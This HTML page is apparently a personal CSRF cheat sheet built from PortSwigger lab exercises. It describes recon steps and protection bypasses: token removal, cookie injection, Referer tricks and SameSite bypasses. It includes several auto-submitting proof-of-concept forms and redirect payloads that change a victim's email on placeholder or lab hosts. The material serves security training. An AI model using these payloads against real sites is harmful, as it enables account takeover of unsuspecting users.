<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>CSRF</title>
  <link rel="stylesheet" href="/static/style.css">

</head>
<body>
<header id="title-block-header">
</header>
<h1 id="cross-site-request-forgery-csrf">Cross-site Request Forgery
(CSRF)</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><p><a href="#recon">Recon for CSRF</a></p></li>
<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
Payloads</a></p></li>
</ul>
<p><br></p>
<h2 id="resources">Resources</h2>
<ul>
<li>https://portswigger.net/web-security/csrf</li>
<li>https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html</li>
<li>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery</li>
</ul>
<p><br></p>
<h2 id="recon">Recon</h2>
<p><br></p>
<h3 id="identify-potential-csrf-vectors">Identify Potential CSRF
Vectors</h3>
<ul>
<li><p>Identify an application function that can be used to perform some
sensitive action on behalf of another user without their knowledge, that
relies solely on cookies for tracking user sessions, and that contains
request parameters that an attacker can fully determine in
advance.</p></li>
<li><p>Some examples of sensitive actions can be changing email address,
password, shipping address, transferring funds, etc.</p></li>
<li><p>Create an HTML page that performs the request without user
interaction.</p>
<ul>
<li>For GET requests, we can place the vulnerable URL inside of an
&lt;img&gt; tag within a src attribute.<br />
</li>
<li>For POST requests, we can create a form that contains all the
required parameters and issues a request to the vulnerable URL.
JavaScript can then be used to automatically submit the form when the
page loads.</li>
</ul></li>
<li><p>While we have an authenticated session on the application, we can
load this HTML page in the same browser to confirm if the request was
processed successfully.</p></li>
</ul>
<p><br></p>
<h3 id="example-payload-csrf-attack-with-get-request">Example Payload:
CSRF attack with GET request</h3>
<ul>
<li>We can use the “src” attribute within an &lt;img&gt; tag to craft
the CSRF exploit, or we can simply just use a stand-alone URL.</li>
</ul>
<div class="sourceCode" id="cb1"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION.net/my-account/change-email?email=TestCSRF%40Test.com&quot;</span><span class="ot"> </span><span class="dt">&gt;</span></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<h3 id="example-payload-csrf-attack-with-post-request">Example Payload:
CSRF attack with POST request</h3>
<ul>
<li>We need to create a form that contains all the required parameters
to submit the request successfully.</li>
</ul>
<div class="sourceCode" id="cb2"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>history<span class="op">.</span><span class="fu">pushState</span>(<span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;/&#39;</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> action</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION.net/my-account/change-email&quot;</span><span class="ot"> method</span><span class="op">=</span><span class="st">&quot;POST&quot;</span><span class="dt">&gt;</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Test@Test.com&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;submit&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Submit request&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="bu">document</span><span class="op">.</span><span class="at">forms</span>[<span class="dv">0</span>]<span class="op">.</span><span class="fu">submit</span>()<span class="op">;</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<p><br></p>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<p><br></p>
<h3 id="no-csrf-protections">No CSRF Protections</h3>
<ul>
<li><p>When no CSRF protections are in place in a state-changing
request, we can create an appropriate HTML page that will submit a
request to the vulnerable application.</p>
<ul>
<li><p>Payloads for CSRF GET requests can be a self-contained attack
within a URL. An attacker does not need to host the exploit code in
their server. They just need to send the malicious link to the victim
user via social engineering techniques.</p></li>
<li><p>Payloads for CSRF POST requests, we need to create a form with
all the data needed to process the request successfully. An attacker
needs to host this code somewhere and send a link of that malicious
site, to the victim user. The browser will automatically add the
Authenticated Session Cookie(s) to the request, when the user clicks on
the link.</p></li>
</ul></li>
</ul>
<p><br></p>
<h3 id="csrf-protection-bypass---http-method-change">CSRF Protection
Bypass - HTTP Method Change</h3>
<ul>
<li><p>When the application is using a CSRF Token in a body parameter of
a POST request, change the HTTP request method to GET and leave out the
CSRF Token parameter. This can potentially bypass the CSRF defense put
in place.</p></li>
<li><p>This can happen due to frameworks only implementing CSRF
protection on state-changing requests, and state-changing requests
should only be done with POST method not GET.</p></li>
</ul>
<p><br></p>
<h3 id="csrf-protection-bypass---remove-csrf-parametervalue">CSRF
Protection Bypass - Remove CSRF Parameter/Value</h3>
<ul>
<li>When the application uses a CSRF Token as header/parameter, remove
the entire CSRF Token parameter and value to potentially bypass this
CSRF protection.</li>
</ul>
<p><br></p>
<h3 id="csrf-protection-bypass-csrf-token-not-tied-to-user-session">CSRF
Protection Bypass – CSRF Token Not Tied to User Session</h3>
<ul>
<li><p>CSRF Tokens may not be tied to the user’s session. The
application may just be keeping a pool of valid tokens and if the
submitted request contains one of these tokens, then the request will be
processed successfully.</p></li>
<li><p>An attacker can log into the application, obtain a valid token
and use this CSRF token when attacking other users via a CSRF
attack.</p></li>
</ul>
<p><br></p>
<h3
id="csrf-protection-bypass-csrf-token-tied-to-an-arbitrary-cookie">CSRF
Protection Bypass – CSRF Token Tied to an Arbitrary Cookie</h3>
<ul>
<li><p>The CSRF Token may be tied to an arbitrary Cookie. If the
application contains some functionality that allows us to set a cookie
in the victim’s browser, we may be able to bypass this
protection.</p></li>
<li><p>The attacker needs to log into the application, obtain a valid
CSRF Token and the Cookie that it is mapped too. Then create a crafted
CSRF exploit that will set the known Cookie in the victim’s browser then
submit the POST request with the necessary parameters, which should
include the known CSRF Token.</p></li>
</ul>
<div class="sourceCode" id="cb3"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>history<span class="op">.</span><span class="fu">pushState</span>(<span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;/&#39;</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> action</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION.net/my-account/change-email&quot;</span><span class="ot"> method</span><span class="op">=</span><span class="st">&quot;POST&quot;</span><span class="dt">&gt;</span></span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Test@Test.com&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;csrf&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;iH07e8eJkWw&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;submit&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Submit request&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;$cookie-injection-url&quot;</span><span class="ot"> onerror</span><span class="op">=</span><span class="st">&quot;document.forms[0].submit()&quot;</span><span class="dt">&gt;</span></span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<h3 id="csrf-protection-bypass-double-submit-cookie-method">CSRF
Protection Bypass – Double Submit Cookie Method</h3>
<ul>
<li><p>Application was using a double submit cookie for CSRF protection.
There was a CSRF Cookie and a CSRF Token parameter in the state-changing
request. These 2 values contained the exact same data; the application
will process the request successfully if those 2 values are
equal.</p></li>
<li><p>If the application contains some functionality that allows us to
set a cookie in the victim’s browser, we may be able to bypass this
protection. By crafting a payload that will set a cookie in the victim’s
browser and supplying the same value as the CSRF Token parameter in the
HTML form.</p></li>
</ul>
<div class="sourceCode" id="cb4"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>  <span class="co">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>history<span class="op">.</span><span class="fu">pushState</span>(<span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;/&#39;</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> action</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION.net/my-account/change-email&quot;</span><span class="ot"> method</span><span class="op">=</span><span class="st">&quot;POST&quot;</span><span class="dt">&gt;</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Test@Test.com&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;csrf&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;iH07e8eJkWw&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;submit&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Submit request&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;$cookie-injection-url&quot;</span><span class="ot"> onerror</span><span class="op">=</span><span class="st">&quot;document.forms[0].submit()&quot;</span><span class="dt">&gt;</span></span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<h3 id="csrf-protection-bypass---referer-header-validation-bypass">CSRF
Protection Bypass - Referer Header Validation Bypass</h3>
<ul>
<li>If the application is using the Referer header for protection
against CSRF, remove the header/value completely and review if the
request was processed successfully.<br />
</li>
<li>If the request was still successful, we can craft an HTML form that
includes some attributes that will cause the browser to drop the
“Referer” header with the request. This will bypass the “protection” in
place.</li>
</ul>
<div class="sourceCode" id="cb5"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">meta</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;referrer&quot;</span><span class="ot"> content</span><span class="op">=</span><span class="st">&quot;never&quot;</span><span class="dt">&gt;</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="co">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>history<span class="op">.</span><span class="fu">pushState</span>(<span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;/&#39;</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> action</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION.net/my-account/change-email&quot;</span><span class="ot"> method</span><span class="op">=</span><span class="st">&quot;POST&quot;</span><span class="dt">&gt;</span></span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Test@Test.com&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;submit&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Submit request&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="bu">document</span><span class="op">.</span><span class="at">forms</span>[<span class="dv">0</span>]<span class="op">.</span><span class="fu">submit</span>()<span class="op">;</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br></p>
<h3 id="csrf-protection-bypass-referer-header-validation-bypass">CSRF
Protection Bypass – Referer Header Validation Bypass</h3>
<ul>
<li><p>The application was using the Referer header to defend against
CSRF attacks. The application was only checking to see if a specific
domain value was somewhere within the “Referer” header.</p></li>
<li><p>This validation can be easily bypassed by submitting a payload
that will inject the required domain value as a query parameter in the
“Referer” header. Which will bypass this restriction, as the application
is only checking if the value is somewhere in the header.</p></li>
</ul>
<div class="sourceCode" id="cb6"><pre
class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">meta</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;referrer&quot;</span><span class="ot"> content</span><span class="op">=</span><span class="st">&quot;unsafe-url&quot;</span><span class="dt">&gt;</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>  <span class="co">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>history<span class="op">.</span><span class="fu">pushState</span>(<span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;/?REQUIRED-REFERER-VALUE&#39;</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> action</span><span class="op">=</span><span class="st">&quot;https://VULNERABLE-APPLICATION.net/my-account/change-email&quot;</span><span class="ot"> method</span><span class="op">=</span><span class="st">&quot;POST&quot;</span><span class="dt">&gt;</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name</span><span class="op">=</span><span class="st">&quot;email&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Test@Test.com&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">&quot;submit&quot;</span><span class="ot"> value</span><span class="op">=</span><span class="st">&quot;Submit request&quot;</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="bu">document</span><span class="op">.</span><span class="at">forms</span>[<span class="dv">0</span>]<span class="op">.</span><span class="fu">submit</span>()<span class="op">;</span><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
<p><br><br></p>
<h3 id="samesite-lax-bypass-via-method-override">SameSite Lax bypass via
method override</h3>
<ul>
<li><p>If the application is setting the session cookie with the
SameSite=Lax configuration, identify all the state changing requests,
and determine if the request can be sent with a GET request.</p></li>
<li><p>If the GET requests are blocked, then we can use method override
to bypass these restrictions. Certain frameworks allow this behavior,
below is an examlpe using the Symfony framework:</p></li>
<li><p>Example:</p>
<ul>
<li><p>_method=POST</p></li>
<li><p>GET
/my-account/change-email?email=foo%40web-security-academy.net&amp;_method=POST
HTTP/1</p></li>
</ul></li>
</ul>
<div class="sourceCode" id="cb7"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&quot;https://0c52008e004f.web-security-academy.net/my-account/change-email?email=test123%40web-security-academy.net&amp;_method=POST&quot;</span><span class="op">;</span></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
<p><br></p>
<h3 id="samesite-strict-bypass-via-client-side-redirect">SameSite Strict
bypass via client-side redirect</h3>
<ul>
<li><p>If a cookie is set with the SameSite=Strict attribute, browsers
won’t include it in any cross-site requests. You may be able to get
around this limitation if you can find a gadget that results in a
secondary request within the same site.</p></li>
<li><p>One possible gadget is a client-side redirect that dynamically
constructs the redirection target using attacker-controllable input like
URL parameters.</p></li>
<li><p>Example: The application is grabbing the value of the “postId”
parameter to initiate a client-side redirect.</p>
<ul>
<li><p>The directory traversal payload in the beginning was required in
order to reach the webroot when the redirection happens.</p></li>
<li><p>https://lab.net/post/comment/confirmation?postId=../my-account/change-email?email=test@test.com</p></li>
</ul></li>
</ul>
<div class="sourceCode" id="cb8"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&quot;https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1&quot;</span><span class="op">;</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
<p><br></p>
<h3 id="samesite-strict-bypass-via-sibling-domain">SameSite Strict
bypass via sibling domain</h3>
<ul>
<li><p>https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain</p></li>
<li><p>If a cookie is set with the SameSite=Strict attribute, browsers
won’t include it in any cross-site requests.</p></li>
<li><p>Identify if there are any vulnerabilities in a sibling domain
within the same site that enables you to elicit a secondary request,
such as an XSS. Using the XSS vector in the sibling domain allows us to
inject the CSRF payload in the request to elicit a same-site request,
then the browser will send the session cookies with that CSRF payload
request.</p></li>
<li><p>This example in the lab, was using the payload to bypass a
Cross-site WebSocket Hijacking (CSWSH) vulnerability as well. See the
WebSocket section for more details on the payloads.</p></li>
</ul>
<p><br></p>
<h3 id="samesite-lax-bypass-via-cookie-refresh">SameSite Lax bypass via
cookie refresh</h3>
<ul>
<li><p>In Chrome, the default configuration for SameSite attribute is
setting the cookie with Lax 120 seconds after it has been set by the
application. This only works when the application does not include the
SameSite attribute when setting the cookie.</p></li>
<li><p>Since there is a 120 second window where the users are
susceptible to cross-site attacks.</p></li>
<li><p>The lab demonstrates an example where we can initiate a request
that will set a fresh cookie in the user’s browser, then submit the CSRF
payload. This allows us to submit the CSRF payload always before it
reaches the 120 seconds time before the Lax config is set.</p></li>
<li><p>The lab combines a functionality used in the OAuth authentication
vulnerability section. See that section for more details on
payloads.</p></li>
<li><p>https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh</p></li>
</ul>
<p><br><br></p>
<h3
id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
to complete labs that are missing from cheat sheet:</h3>
<ul>
<li>All labs in this category are completed and referenced in cheat
sheet.</li>
</ul>
</body>
</html>
